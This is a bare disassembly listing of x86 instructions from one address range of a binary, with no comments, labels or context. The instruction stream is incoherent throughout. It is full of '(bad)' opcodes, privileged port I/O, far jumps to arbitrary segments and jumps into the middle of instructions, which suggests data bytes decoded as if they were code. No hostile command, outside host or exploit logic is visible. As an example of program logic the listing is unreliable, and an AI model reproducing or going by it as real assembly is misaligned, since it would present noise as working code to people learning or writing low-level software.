  41b8ca:	addr16 int 0x73
  41b8cd:	ret    0xd797
  41b8d0:	outs   dx,BYTE PTR ds:[esi]
  41b8d1:	lahf   
  41b8d2:	xor    bl,BYTE PTR [esi+0x76]
  41b8d5:	inc    ebx
  41b8d6:	scas   al,BYTE PTR es:[edi]
  41b8d7:	cmp    ch,dh
  41b8d9:	jae    0x41b8c9
  41b8db:	not    DWORD PTR [esi]
  41b8dd:	xchg   edi,eax
  41b8de:	in     eax,dx
  41b8df:	jne    0x41b8ef
  41b8e1:	lahf   
  41b8e2:	loop   0x41b93f
  41b8e4:	cmp    eax,0x4a53c350
  41b8e9:	retf   0x80e4
  41b8ec:	inc    esp
  41b8ed:	jp     0x41b920
  41b8ef:	inc    ecx
  41b8f0:	jnp    0x41b941
  41b8f2:	fidiv  WORD PTR [edx-0x76]
  41b8f5:	pop    eax
  41b8f6:	mov    eax,ds:0x889fb83c
  41b8fb:	ja     0x41b905
  41b8fd:	addr16 icebp 
  41b8ff:	leave  
  41b900:	out    dx,al
  41b901:	pop    ss
  41b902:	jecxz  0x41b8a5
  41b904:	add    DWORD PTR [esi+0x7e],edx
  41b907:	idiv   BYTE PTR [ebp+0x20a5c1f1]
  41b90d:	ins    DWORD PTR es:[edi],dx
  41b90e:	ss ja  0x41b920
  41b911:	popf   
  41b912:	push   edi
  41b913:	and    BYTE PTR [edi-0x71747acc],al
  41b919:	sbb    esp,DWORD PTR [ebp+0x7b]
  41b91c:	and    BYTE PTR [edi-0x55dc5f7b],ah
  41b922:	mov    fs,WORD PTR [esi+ebp*4+0x55]
  41b926:	daa    
  41b927:	mov    dl,0xe8
  41b929:	mov    edx,0xec93ace1
  41b92e:	int3   
  41b92f:	sahf   
  41b930:	(bad)  [edi-0x3]
  41b933:	jmp    0x41b962
  41b935:	mov    bh,0x41
  41b937:	pop    eax
  41b938:	jp     0x41b8dd
  41b93a:	xor    DWORD PTR [esp+eiz*4],esi
  41b93d:	sbb    ebx,ebp
  41b93f:	fwait
  41b940:	push   esp
  41b941:	scas   eax,DWORD PTR es:[edi]
  41b942:	push   ebp
  41b943:	inc    ecx
  41b944:	pop    esi
  41b945:	sbb    BYTE PTR [edi+edx*8+0x1b87c640],0x21
  41b94d:	ins    BYTE PTR es:[edi],dx
  41b94e:	ins    BYTE PTR es:[edi],dx
  41b94f:	cmp    ch,bl
  41b951:	jge    0x41b9b0
  41b953:	stc    
  41b954:	mov    bl,0xbf
  41b956:	xchg   edi,eax
  41b957:	add    eax,0x5b236783
  41b95c:	aad    0x6e
  41b95e:	xor    al,0x46
  41b960:	cs sub eax,0xf3e53385
  41b966:	mov    eax,0x6a0de140
  41b96b:	cli    
  41b96c:	enter  0x4b08,0x5b
  41b970:	jb     0x41b95a
  41b972:	and    ebp,DWORD PTR [esi+0x436db46b]
  41b978:	into   
  41b979:	xor    al,0xee
  41b97b:	mov    ecx,0x7b342fff
  41b980:	cmp    DWORD PTR [ebp+0x37],esi
  41b983:	push   es
  41b984:	scas   eax,DWORD PTR es:[edi]
  41b985:	pop    ebx
  41b986:	jecxz  0x41b9ce
  41b988:	dec    ebx
  41b989:	mov    cl,0x56
  41b98b:	scas   al,BYTE PTR es:[edi]
  41b98c:	retf   0x8f00
  41b98f:	mov    ecx,0xb080bd5e
  41b994:	pushf  
  41b995:	ret    0x7828
  41b998:	pop    esi
  41b999:	jmp    0x610d:0x366ec058
  41b9a0:	les    ecx,FWORD PTR ds:0xa0e7e09f
  41b9a6:	nop
  41b9a7:	fst    DWORD PTR ds:0xa29660e5
  41b9ad:	and    DWORD PTR [edx-0x1f],edi
  41b9b0:	push   ebx
  41b9b1:	pop    ss
  41b9b2:	push   0xf180091b
  41b9b7:	(bad)  
  41b9b8:	sbb    eax,0x78e96288
  41b9bd:	out    0xec,al
  41b9bf:	add    ch,BYTE PTR [esi-0x5a7215cc]
  41b9c5:	jg     0x41ba3c
  41b9c7:	jnp    0x41b9f3
  41b9c9:	les    ebp,FWORD PTR [ebp-0x3c55bb04]
  41b9cf:	dec    esi
  41b9d0:	clc    
  41b9d1:	sbb    al,0x41
  41b9d3:	aas    
  41b9d4:	or     eax,0x76cd1b6e
  41b9d9:	xchg   ebx,eax
  41b9da:	xor    eax,0x31ec4ce
  41b9df:	inc    ecx
  41b9e0:	adc    eax,0x635e850
  41b9e5:	(bad)  
  41b9e6:	jmp    0x41ba1e
  41b9e8:	retf   
  41b9e9:	jp     0x41ba31
  41b9eb:	push   0xffffffc4
  41b9ed:	ret    0x62e6
  41b9f0:	call   0xd94b:0x982dc0d1
  41b9f7:	jb     0x41ba1d
  41b9f9:	es push ds
  41b9fb:	mov    bh,0xf7
  41b9fd:	add    ecx,DWORD PTR [eax-0x20]
  41ba00:	or     edx,DWORD PTR [ebx+0x7d7703a8]
  41ba06:	fimul  DWORD PTR [esi-0x5]
  41ba09:	rol    DWORD PTR [edi-0x756c3736],0x45
  41ba10:	jge    0x41ba2f
  41ba12:	(bad)  
  41ba13:	fild   DWORD PTR [ecx-0x75]
  41ba16:	mov    WORD PTR [eax],ds
  41ba18:	sub    eax,0xff1abda1
  41ba1d:	mov    eax,0x1cc8de86
  41ba22:	jns    0x41b9d7
  41ba24:	cli    
  41ba25:	addr16 pop esi
  41ba27:	inc    ebp
  41ba28:	push   esp
  41ba29:	int    0x65
  41ba2b:	cmc    
  41ba2c:	ins    BYTE PTR es:[edi],dx
  41ba2d:	aad    0x8d
  41ba2f:	push   ss
  41ba30:	leave  
  41ba31:	aad    0x55
  41ba33:	inc    ebx
  41ba34:	inc    eax
  41ba35:	mov    ds:0xb01ccc37,eax
  41ba3a:	mov    ds:0x40d836b6,al
  41ba3f:	mov    ebx,?
  41ba41:	push   esp
  41ba42:	mov    edx,DWORD PTR [edx]
  41ba44:	push   0x76
  41ba46:	fcom   QWORD PTR [ebx]
  41ba48:	mov    WORD PTR [edi+0x7e65a963],cs
  41ba4e:	gs fwait
  41ba50:	push   edx
  41ba51:	cs pop edx
  41ba53:	sub    ebp,ebp
  41ba55:	popa   
  41ba56:	in     eax,0xf8
  41ba58:	aad    0x2a
  41ba5a:	aam    0xa8
  41ba5c:	(bad)  
  41ba5d:	frstor [edx]
  41ba5f:	shl    ecx,cl
  41ba61:	sbb    BYTE PTR [edi-0x33],ch
  41ba64:	mov    esi,0xad1210a9
  41ba69:	dec    esp
  41ba6a:	xchg   edx,eax
  41ba6b:	push   esp
  41ba6c:	out    0xa,eax
  41ba6e:	pop    edi
  41ba6f:	mov    esp,0x7f72937e
  41ba74:	fcomi  st,st(6)
  41ba76:	sub    al,0xb1
  41ba78:	mov    dh,0x77
  41ba7a:	mov    ch,0xa1
  41ba7c:	and    ebp,0x13
  41ba7f:	fwait
  41ba80:	lods   al,BYTE PTR ds:[esi]
  41ba81:	imul   esi,ebp,0x165e1a97
  41ba87:	or     BYTE PTR [eax+esi*4],cl
  41ba8a:	pop    ss
  41ba8b:	ins    DWORD PTR es:[edi],dx
  41ba8c:	mov    ds:0x5fde84f0,eax
  41ba91:	cld    
  41ba92:	mov    eax,0x49d13acf
  41ba97:	mov    bl,0x20
  41ba99:	jns    0x41bb0c
  41ba9b:	mov    eax,0x30f4673c
  41baa0:	and    al,0x72
  41baa2:	ins    DWORD PTR es:[edi],dx
  41baa3:	iret   
  41baa4:	test   BYTE PTR [ebx+0x655c9404],0xe2
  41baab:	adc    al,0xae
  41baad:	loop   0x41bb2e
  41baaf:	arpl   WORD PTR [esi],si
  41bab1:	outs   dx,DWORD PTR ds:[esi]
  41bab2:	sub    bl,BYTE PTR [ebx-0x5c]
  41bab5:	mov    ch,0x9f
  41bab7:	stos   BYTE PTR es:[edi],al
  41bab8:	ss inc eax
  41baba:	add    al,BYTE PTR [edx]
  41babc:	xor    cl,BYTE PTR [ecx+0x2c2d0a3c]
  41bac2:	bound  ebp,QWORD PTR [edi+0x470e8bed]
  41bac8:	xor    al,0xfb
  41baca:	mov    al,ds:0x1109be8b
  41bacf:	pop    ss
  41bad0:	inc    ebx
  41bad1:	xchg   ecx,eax
  41bad2:	ror    ebp,cl
  41bad4:	ret    0x40e7
  41bad7:	jb     0x41bb3e
  41bad9:	xor    BYTE PTR [ebx+0x60a1a1c],al
  41badf:	inc    eax
  41bae0:	rcr    DWORD PTR [ebp+0xc],0xe6
  41bae4:	gs mov bh,0xa2
  41bae7:	cmc    
  41bae8:	jno    0x41bb68
  41baea:	daa    
  41baeb:	loope  0x41ba84
  41baed:	jns    0x41bb18
  41baef:	movntq QWORD PTR [ecx+0x24],mm0
  41baf3:	pop    ecx
  41baf4:	xchg   esp,eax
  41baf5:	ror    DWORD PTR [eax],cl
  41baf7:	cmp    al,0xc6
  41baf9:	add    al,0x73
  41bafb:	aas    
  41bafc:	mov    dh,0xe7
  41bafe:	cmp    DWORD PTR [edx],eax
  41bb00:	inc    esi
  41bb01:	popf   
  41bb02:	imul   edi,DWORD PTR [ebx+esi*8],0xffffff85
  41bb06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb07:	mov    esi,0x35a753e5
  41bb0c:	jg     0x41bab7
  41bb0e:	in     eax,dx
  41bb0f:	xchg   BYTE PTR [edx-0x780b53aa],ch
  41bb15:	pop    esp
  41bb16:	and    cl,BYTE PTR [ecx-0x80]
  41bb19:	mov    edx,0x5db78725
  41bb1e:	mov    dh,0x54
  41bb20:	cdq    
  41bb21:	xchg   ebx,eax
  41bb22:	loop   0x41baa4
  41bb24:	shl    BYTE PTR [ecx],0x3b
  41bb27:	call   0xa888aae1
  41bb2c:	cli    
  41bb2d:	xchg   DWORD PTR [ebp-0x4f958a3f],ebx
  41bb33:	inc    edi
  41bb34:	push   edi
  41bb35:	or     ch,BYTE PTR [ecx]
  41bb37:	add    ch,BYTE PTR [ebp-0x6c]
  41bb3a:	outs   dx,DWORD PTR ss:[esi]
  41bb3c:	stos   DWORD PTR es:[edi],eax
  41bb3d:	lods   al,BYTE PTR ds:[esi]
  41bb3e:	mov    ebp,0x1cb6da81
  41bb43:	adc    al,0xda
  41bb45:	cwde   
  41bb46:	(bad)  
  41bb47:	xchg   esp,eax
  41bb48:	popa   
  41bb49:	pop    ebx
  41bb4a:	cld    
  41bb4b:	xchg   ecx,eax
  41bb4c:	mov    esi,0x5b91cea5
  41bb51:	dec    ecx
  41bb52:	call   DWORD PTR ds:0x1c3c062
  41bb58:	in     eax,dx
  41bb59:	mov    ebx,0xe6c1f42c
  41bb5e:	inc    ecx
  41bb5f:	push   ebp
  41bb60:	lds    edi,FWORD PTR [esi]
  41bb62:	hlt    
  41bb63:	or     al,0xdb
  41bb65:	push   es
  41bb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb67:	test   al,0x5b
  41bb69:	adc    DWORD PTR [edx+0x56ae1b2d],ebp
  41bb6f:	mov    ds:0x5f494da1,eax
  41bb74:	out    dx,al
  41bb75:	pop    edi
  41bb76:	cdq    
  41bb77:	(bad)  
  41bb78:	lods   al,BYTE PTR ds:[esi]
  41bb79:	pop    esp
  41bb7a:	call   0x93:0xf64e317c
  41bb81:	std    
  41bb82:	push   ebx
  41bb83:	in     al,dx
  41bb84:	idiv   esi
  41bb86:	addr16 mov ebx,0x7f926c1b
  41bb8c:	jnp    0x41bbcc
  41bb8e:	and    BYTE PTR [esi+edi*2-0x6e],cl
  41bb92:	mov    DWORD PTR [esi-0x8],ebx
  41bb95:	(bad)  
  41bb96:	jo     0x41bb1e
  41bb98:	sub    eax,0x3e6b1457
  41bb9d:	mov    esi,0xd3e3e9a6
  41bba2:	sbb    eax,0x78741b71
  41bba7:	sar    DWORD PTR [edx-0x1d],1
  41bbaa:	test   al,0xdb
  41bbac:	dec    edx
  41bbad:	test   DWORD PTR [ebx-0x63],esi
  41bbb0:	sbb    al,BYTE PTR [ebp+ebp*8-0x2a]
  41bbb4:	fiadd  DWORD PTR [eax-0x14]
  41bbb7:	sbb    al,0xe
  41bbb9:	adc    esp,0xb493fb83
  41bbbf:	dec    ebx
  41bbc0:	sar    BYTE PTR [ebx],1
  41bbc2:	cmp    BYTE PTR [edi-0x36ded72b],0x45
  41bbc9:	imul   ebp,DWORD PTR [ecx+0x749c9825],0xffffffd8
  41bbd0:	dec    ebp
  41bbd1:	ins    DWORD PTR es:[edi],dx
  41bbd2:	mov    al,0x3
  41bbd4:	add    bl,al
  41bbd6:	adc    eax,DWORD PTR ds:0x23813214
  41bbdc:	mov    al,ds:0x5592eda7
  41bbe1:	out    0x56,eax
  41bbe3:	fmul   QWORD PTR [ebx]
  41bbe5:	bound  edi,QWORD PTR [edx-0x62b7d91]
  41bbeb:	in     eax,dx
  41bbec:	fidivr DWORD PTR [ebx]
  41bbee:	adc    eax,0xb7702e7d
  41bbf3:	and    BYTE PTR [ebx+0x32f61e72],ah
  41bbf9:	nop
  41bbfa:	fst    DWORD PTR [ecx+0x16]
  41bbfd:	sahf   
  41bbfe:	and    DWORD PTR [eax],edx
  41bc00:	mov    esp,0x9670c6cd
  41bc05:	or     eax,0xc96d78f8
  41bc0a:	xchg   esi,eax
  41bc0b:	jg     0x41bc0c
  41bc0d:	pop    es
  41bc0e:	ins    DWORD PTR es:[edi],dx
  41bc0f:	jb     0x41bbf3
  41bc11:	mov    dl,0x8
  41bc13:	inc    ebp
  41bc14:	(bad)  
  41bc16:	fild   QWORD PTR [ebx-0x80]
  41bc19:	push   edi
  41bc1a:	and    DWORD PTR [edx+0x7e],ebp
  41bc1d:	jno    0x41bc59
  41bc1f:	push   esp
  41bc20:	inc    eax
  41bc21:	push   esp
  41bc22:	lods   eax,DWORD PTR ds:[esi]
  41bc23:	pop    ds
  41bc24:	cli    
  41bc25:	arpl   cx,sp
  41bc27:	daa    
  41bc28:	xor    ebp,DWORD PTR [esp+esi*1+0x1dcf2fcc]
  41bc2f:	dec    ecx
  41bc30:	pop    eax
  41bc31:	or     bh,dl
  41bc33:	xchg   esp,eax
  41bc34:	mov    ah,0xb7
  41bc36:	loopne 0x41bc3e
  41bc38:	(bad)  
  41bc39:	cmp    eax,0xe8478447
  41bc3e:	mov    eax,ds:0x178ac36e
  41bc43:	inc    edi
  41bc44:	ds repz mov dh,0xc9
  41bc48:	and    al,0x5b
  41bc4a:	(bad)  
  41bc4b:	scas   eax,DWORD PTR es:[edi]
  41bc4c:	mov    eax,DWORD PTR [ebx-0x44]
  41bc4f:	repz jae 0x41bc9a
  41bc52:	add    DWORD PTR [edx+0x6f29f8b],0x18
  41bc59:	xchg   ebp,eax
  41bc5a:	(bad)  
  41bc5b:	cli    
  41bc5c:	(bad)  
  41bc5d:	cmp    ebx,DWORD PTR [ecx]
  41bc5f:	xchg   ebp,eax
  41bc60:	cmp    DWORD PTR [eax+ebx*2+0x6b9be1a2],esi
  41bc67:	push   0x22
  41bc69:	cwde   
  41bc6a:	dec    esp
  41bc6b:	mov    dl,BYTE PTR [esi+eiz*4-0x1c09b71e]
  41bc72:	and    DWORD PTR [edx-0x28465b5e],ebx
  41bc78:	sub    al,0xad
  41bc7a:	mov    edx,0xb1d88f6f
  41bc7f:	sub    ebp,eax
  41bc81:	dec    ecx
  41bc82:	sti    
  41bc83:	lds    esi,FWORD PTR [edx]
  41bc85:	jg     0x41bcb0
  41bc87:	and    al,0x65
  41bc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc8a:	xchg   DWORD PTR [ebx],esp
  41bc8c:	sub    BYTE PTR [esi-0x1a],al
  41bc8f:	cmp    eax,0xd29b8e84
  41bc94:	sbb    ecx,DWORD PTR [ebx-0x208ead33]
  41bc9a:	gs std 
  41bc9c:	fisttp QWORD PTR [edx-0x1a0e60bf]
  41bca2:	ins    BYTE PTR es:[edi],dx
  41bca3:	mov    edi,0x267a3317
  41bca8:	jp     0x41bd22
  41bcaa:	xchg   ecx,eax
  41bcab:	inc    edi
  41bcac:	cmp    DWORD PTR [eax],esp
  41bcae:	mov    ebx,0xd231208a
  41bcb3:	and    BYTE PTR [edx],ah
  41bcb5:	imul   edx,DWORD PTR [edi+ebp*8-0x6a],0x1b78a491
  41bcbd:	int    0x5e
  41bcbf:	test   al,0x4f
  41bcc1:	loope  0x41bd0c
  41bcc3:	xor    DWORD PTR [ecx+eiz*1-0x32eba5bf],esi
  41bcca:	xor    DWORD PTR [ebx+0x63],eax
  41bccd:	mov    edi,0x3a324efb
  41bcd2:	ins    BYTE PTR es:[edi],dx
  41bcd3:	add    DWORD PTR [ecx+eax*8],ebp
  41bcd6:	pop    eax
  41bcd7:	shr    DWORD PTR ds:0x9f72d285,1
  41bcdd:	std    
  41bcde:	mov    cl,0x68
  41bce0:	push   eax
  41bce1:	imul   bp,WORD PTR [ecx],0xb89f
  41bce6:	push   ecx
  41bce7:	and    DWORD PTR [esi+ebp*1],ebx
  41bcea:	mov    bl,0x46
  41bcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bced:	loop   0x41bd0a
  41bcef:	js     0x41bd4c
  41bcf1:	or     BYTE PTR ds:0x6781e618,bl
  41bcf7:	jp     0x41bd27
  41bcf9:	mov    ebx,0x102ef1a1
  41bcfe:	pop    ds
  41bcff:	sub    ch,BYTE PTR [edi+0x5362c935]
  41bd05:	push   ebp
  41bd06:	mov    ch,0x20
  41bd08:	sub    ebx,esi
  41bd0a:	cli    
  41bd0b:	add    al,0xb8
  41bd0d:	aaa    
  41bd0e:	pmaddwd mm7,mm5
  41bd11:	pop    ecx
  41bd12:	(bad)  
  41bd13:	not    BYTE PTR [esi]
  41bd15:	inc    edi
  41bd16:	mov    edi,0xaad1d08d
  41bd1b:	adc    edi,DWORD PTR [edx+0x52c6c1ab]
  41bd21:	pop    ss
  41bd22:	lods   eax,DWORD PTR ds:[si]
  41bd24:	fwait
  41bd25:	or     DWORD PTR [edx],edx
  41bd27:	je     0x41bd91
  41bd29:	rcr    DWORD PTR [esi+eiz*1-0x3c],cl
  41bd2d:	sub    BYTE PTR [eax+0x2c3b841f],bl
  41bd33:	sbb    DWORD PTR [esi+esi*8],ebx
  41bd36:	add    bl,dl
  41bd38:	mov    al,ds:0xbdfad312
  41bd3d:	bound  esp,QWORD PTR [edx-0x11]
  41bd40:	sub    al,ch
  41bd42:	jmp    0x13b4301c
  41bd47:	in     al,dx
  41bd48:	aam    0x2a
  41bd4a:	shr    DWORD PTR [ebp+0x6e5ed861],1
  41bd50:	jecxz  0x41bd4c
  41bd52:	and    DWORD PTR [ebp-0x51fdfa68],ebp
  41bd58:	pop    ss
  41bd59:	mov    ds:0x66bac113,eax
  41bd5e:	cld    
  41bd5f:	sbb    eax,0xedf09009
  41bd64:	mov    ch,0x69
  41bd66:	leave  
  41bd67:	sub    ah,cl
  41bd69:	aad    0x5e
  41bd6b:	sar    DWORD PTR [esi-0x4f],1
  41bd6e:	jge    0x41bdeb
  41bd70:	xor    DWORD PTR [esi-0x10],eax
  41bd73:	(bad)  
  41bd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd75:	inc    esp
  41bd76:	jl     0x41bd51
  41bd78:	dec    ecx
  41bd79:	mov    ds:0xaaa4eee8,eax
  41bd7e:	pop    edx
  41bd7f:	inc    eax
  41bd80:	lods   eax,DWORD PTR ds:[esi]
  41bd81:	cli    
  41bd82:	cwde   
  41bd83:	cwde   
  41bd84:	push   eax
  41bd85:	mov    al,ds:0x21685a07
  41bd8a:	dec    ecx
  41bd8b:	mov    ch,0x33
  41bd8d:	mov    al,ds:0x6c650c5e
  41bd92:	dec    esi
  41bd93:	push   esi
  41bd94:	fimul  WORD PTR [edi+0x56]
  41bd97:	xor    dl,BYTE PTR [edi-0x69e58a07]
  41bd9d:	mov    cl,0x1e
  41bd9f:	inc    eax
  41bda0:	push   0x52fd25af
  41bda5:	mov    esi,0x6d671f60
  41bdaa:	cmp    BYTE PTR [ecx-0x6602a126],0xe3
  41bdb1:	xlat   BYTE PTR ds:[ebx]
  41bdb2:	mov    ebp,DWORD PTR [eax+0x623517a7]
  41bdb8:	ret    
  41bdb9:	mov    ds:0x88d75d7b,al
  41bdbe:	mov    esp,0x4f725ad0
  41bdc3:	push   esi
  41bdc4:	inc    esi
  41bdc5:	jmp    0x63e2:0x81ab1b0d
  41bdcc:	je     0x41bd5f
  41bdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdcf:	mov    ch,0xd6
  41bdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdd2:	les    eax,FWORD PTR [ebx+0x7f9fc7d3]
  41bdd8:	sbb    DWORD PTR [ecx+0x2b],esp
  41bddb:	mov    edi,0x628db8bc
  41bde0:	lds    ebp,FWORD PTR [eax-0x42b066a9]
  41bde6:	mov    DWORD PTR [edi+0x19f72a43],ebx
  41bdec:	jo     0x41bd9b
  41bdee:	or     esi,DWORD PTR [esi+esi*8+0x116f656f]
  41bdf5:	test   BYTE PTR [ecx+0x581025b6],0x81
  41bdfc:	fnstsw WORD PTR [edx]
  41bdfe:	cli    
  41bdff:	shl    DWORD PTR [ebp-0x3b],1
  41be02:	neg    DWORD PTR [ebp+0x13a0cbab]
  41be08:	jmp    0xc503:0xea4af679
  41be0f:	jne    0x41be31
  41be11:	cmp    BYTE PTR [ebp+edi*1-0x1d],bl
  41be15:	cmp    eax,0xa7203a0f
  41be1a:	sub    DWORD PTR gs:[ebp-0x1bd7ffef],edi
  41be21:	mov    ds:0x9a5ef193,eax
  41be26:	in     al,dx
  41be27:	fcomi  st,st(4)
  41be29:	jmp    0x96399e06
  41be2e:	xor    al,0xc6
  41be30:	jecxz  0x41be1a
  41be32:	dec    edi
  41be33:	mov    bh,0x3a
  41be35:	enter  0xb5bc,0x89
  41be39:	ror    DWORD PTR [edi-0x16],cl
  41be3c:	sub    al,0x57
  41be3e:	stos   DWORD PTR es:[edi],eax
  41be3f:	xchg   DWORD PTR [edi-0x715d4f81],ecx
  41be45:	pop    ss
  41be46:	stos   DWORD PTR es:[edi],eax
  41be47:	sub    WORD PTR [ecx+0x76],si
  41be4b:	sbb    eax,0x6576218b
  41be50:	outs   dx,DWORD PTR ds:[esi]
  41be51:	sahf   
  41be52:	mov    WORD PTR [edx+0x5a751f22],es
  41be58:	cmp    BYTE PTR [edi-0x543ddc2e],ch
  41be5e:	adc    dh,BYTE PTR [ebp+0x9]
  41be61:	push   edi
  41be62:	fdivr  st(1),st
  41be64:	mov    ds:0x62b7b1a,eax
  41be69:	cmp    eax,0x6cea90a4
  41be6e:	mov    ss,WORD PTR [ebp-0x728e1a88]
  41be74:	mov    dh,0x32
  41be76:	mov    eax,ds:0x923f9503
  41be7b:	aad    0xfb
  41be7d:	mov    es,WORD PTR [esi-0x4a]
  41be80:	mov    DWORD PTR [esi],edi
  41be82:	mov    bh,ch
  41be84:	sar    bh,0xbb
  41be87:	in     eax,dx
  41be88:	push   ss
  41be89:	cs scas al,BYTE PTR es:[edi]
  41be8b:	add    al,0x45
  41be8d:	pop    es
  41be8e:	mov    al,0x90
  41be90:	push   esi
  41be91:	push   ss
  41be92:	std    
  41be93:	push   ebp
  41be94:	jge    0x41beda
  41be96:	jl     0x41be3d
  41be98:	fcmovne st,st(2)
  41be9a:	(bad)  
  41be9b:	mov    esp,0x9cb2dd26
  41bea0:	lahf   
  41bea1:	adc    eax,0x9706d955
  41bea6:	sbb    DWORD PTR [edi],ecx
  41bea8:	lahf   
  41bea9:	repz adc DWORD PTR [esi+0x17b220c4],ecx
  41beb0:	sub    DWORD PTR [esi-0x1e],ecx
  41beb3:	and    edi,DWORD PTR [ecx]
  41beb5:	add    bh,ah
  41beb7:	pop    ebx
  41beb8:	adc    eax,0x5ebe3fc
  41bebd:	in     eax,0xcf
  41bebf:	add    ebp,DWORD PTR [ebp-0x38ed005e]
  41bec5:	cdq    
  41bec6:	(bad)  
  41bec7:	cmc    
  41bec8:	or     dh,ah
  41beca:	add    DWORD PTR [edx+edx*8+0x7205af60],0xb3dc24a3
  41bed5:	jns    0x41bede
  41bed7:	jl     0x41bf19
  41bed9:	pop    edi
  41beda:	pop    edi
  41bedb:	pusha  
  41bedc:	mov    ebp,0xefa705bf
  41bee1:	adc    ch,bl
  41bee3:	sub    al,BYTE PTR [eax-0x78]
  41bee6:	lock and DWORD PTR [eax-0x7f37b71a],eax
  41beed:	fild   WORD PTR [edi]
  41beef:	aaa    
  41bef0:	test   eax,0xff2f62ff
  41bef5:	mov    edx,0xb17b642b
  41befa:	(bad)  [edi+eax*1+0x45]
  41befe:	push   ebx
  41beff:	jne    0x41bee1
  41bf01:	je     0x41bf4c
  41bf03:	and    ah,cl
  41bf05:	stos   DWORD PTR es:[edi],eax
  41bf06:	std    
  41bf07:	lea    esi,[edi+0x55]
  41bf0a:	inc    esp
  41bf0b:	push   edx
  41bf0c:	shr    BYTE PTR [esi],0xf1
  41bf0f:	out    dx,al
  41bf10:	out    dx,eax
  41bf11:	(bad)  
  41bf12:	fs push ebp
  41bf14:	and    al,0x55
  41bf16:	mov    ebx,0xc7b0bfd
  41bf1b:	rol    DWORD PTR [ebx+0x61f1c2d9],cl
  41bf21:	push   ss
  41bf22:	mov    ebx,0x403b297e
  41bf27:	add    ch,BYTE PTR [eax-0x67]
  41bf2a:	repnz ins BYTE PTR es:[edi],dx
  41bf2c:	outs   dx,BYTE PTR ds:[esi]
  41bf2d:	and    eax,0xbf8c012e
  41bf32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf33:	and    DWORD PTR [edx],ebx
  41bf35:	xchg   edx,eax
  41bf36:	enter  0x23c7,0x9a
  41bf3a:	mov    cl,0x58
  41bf3c:	mov    cl,0xa2
  41bf3e:	sub    dl,BYTE PTR [ecx]
  41bf40:	adc    BYTE PTR [ebx-0x2],al
  41bf43:	sub    eax,DWORD PTR [ecx+0x3378237b]
  41bf49:	aad    0x3c
  41bf4b:	jl     0x41bf2f
  41bf4d:	xchg   edi,eax
  41bf4e:	or     DWORD PTR [edi+0x3cc4890a],ebx
  41bf54:	inc    esi
  41bf55:	add    eax,ecx
  41bf57:	cmp    BYTE PTR ds:0xf84b37a1,al
  41bf5d:	mov    edx,edi
  41bf5f:	xchg   edi,eax
  41bf60:	ret    0xa1b
  41bf63:	js     0x41bf9e
  41bf65:	ret    0x4431
  41bf68:	and    eax,0x11650ebd
  41bf6d:	xchg   esi,eax
  41bf6e:	and    al,0x34
  41bf70:	fs pop eax
  41bf72:	xchg   BYTE PTR [ebp+ebx*4-0xa11765],al
  41bf79:	add    BYTE PTR [esi-0x21474f12],ch
  41bf7f:	or     ebp,edi
  41bf81:	(bad)  
  41bf82:	xchg   ecx,eax
  41bf83:	ins    DWORD PTR es:[edi],dx
  41bf84:	add    DWORD PTR [ebx-0x2],edx
  41bf87:	xor    esp,DWORD PTR [edx+0x75]
  41bf8a:	jns    0x41bfbf
  41bf8c:	lods   eax,DWORD PTR ds:[esi]
  41bf8d:	retf   
  41bf8e:	idiv   DWORD PTR [ecx+edx*1+0x3e]
  41bf92:	dec    esi
  41bf93:	sar    DWORD PTR [esi+0x1a],1
  41bf96:	push   ds
  41bf97:	sar    BYTE PTR [edx+0x208ab7a7],1
  41bf9d:	cmp    DWORD PTR [eax+esi*1],0x7dc82b3e
  41bfa4:	and    BYTE PTR [esi+ebx*1-0x6d777948],ah
  41bfab:	pop    eax
  41bfac:	xchg   ebp,eax
  41bfad:	cmp    eax,0x346d4919
  41bfb2:	aam    0x3c
  41bfb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb5:	test   DWORD PTR [eax-0xd2ada7c],ecx
  41bfbb:	mov    edx,0xc43faff5
  41bfc0:	or     eax,0x5d95f2b7
  41bfc5:	xchg   bh,bh
  41bfc7:	cmp    BYTE PTR [ecx],ch
  41bfc9:	sahf   
  41bfca:	adc    BYTE PTR [eax],dh
  41bfcc:	ret    0xfdfb
  41bfcf:	or     BYTE PTR [edi+0x9a98870],cl
  41bfd5:	into   
  41bfd6:	fnstsw WORD PTR [eax]
  41bfd8:	pop    esi
  41bfd9:	sbb    BYTE PTR [eax+ebp*2+0x57],ah
  41bfdd:	cmp    al,0xe5
  41bfdf:	dec    edx
  41bfe0:	inc    ecx
  41bfe1:	mov    edx,0xcf2a7c3d
  41bfe6:	mov    es,WORD PTR [esi-0x12]
  41bfe9:	pop    ds
  41bfea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfeb:	jmp    0xc997:0x7f03a305
  41bff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff3:	inc    ebx
  41bff4:	nop
  41bff5:	jnp    0x41bff3
  41bff7:	leave  
  41bff8:	fcmovnb st,st(2)
  41bffa:	and    DWORD PTR [ecx+0x32],ecx
  41bffd:	fwait
  41bffe:	mov    ds:0xcf09c6af,al
  41c003:	test   eax,0xb63fdb28
  41c008:	lods   eax,DWORD PTR ds:[esi]
  41c009:	lods   eax,DWORD PTR ds:[esi]
  41c00a:	mov    al,0x19
  41c00c:	mov    ebp,0x2bc02151
  41c011:	mov    esi,0x77e8182e
  41c016:	sub    ebp,ebp
  41c018:	dec    ebx
  41c019:	call   DWORD PTR [ebp+0x526f923f]
  41c01f:	rcl    BYTE PTR [eax-0x31],0xdf
  41c023:	retf   0x22cc
  41c026:	sbb    BYTE PTR [edi-0x4f],dl
  41c029:	mov    esp,0xfc29b9de
  41c02e:	leave  
  41c02f:	clc    
  41c030:	in     al,0x8e
  41c032:	mov    BYTE PTR [ecx-0x20e42dac],dh
  41c038:	cmp    DWORD PTR [ebp+eax*1+0x151c4855],esi
  41c03f:	rcr    BYTE PTR [eax+0x7],cl
  41c042:	mov    eax,0xf830fa2c
  41c047:	or     ah,ch
  41c049:	data16 (bad) [eax-0x6b6da8b5]
